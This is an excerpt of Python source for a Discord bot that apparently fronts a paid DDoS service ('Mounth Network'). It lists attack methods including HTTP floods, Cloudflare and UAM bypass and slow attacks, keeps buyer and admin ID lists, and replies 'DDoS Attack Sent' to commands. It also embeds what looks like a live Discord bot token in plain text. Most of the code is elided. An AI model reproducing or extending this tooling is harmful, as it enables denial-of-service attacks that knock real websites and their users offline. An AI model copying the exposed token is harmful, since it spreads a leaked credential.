...
buyers  = [922147071522390037]  #          
admins  = [922147071522390037]  #   ID users            
owners  = [922147071522390037]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTA3NjE2NzAzODUyOTE3OTY5OA.GMhbDq.q2c7ok2m0UaQ58ktrPSAbZRy2n0ZtdS9X4-Qg0' # paste your token here
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="Mounth Network | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        ...
        embed.set_footer(text = f"©{year_now} Copyright Mounth.")
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"Mounth Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                    ...
                    embed.set_footer(text = f"©{year_now} Copyright Mounth Tran.")
                    await ctx.send(embed=embed)
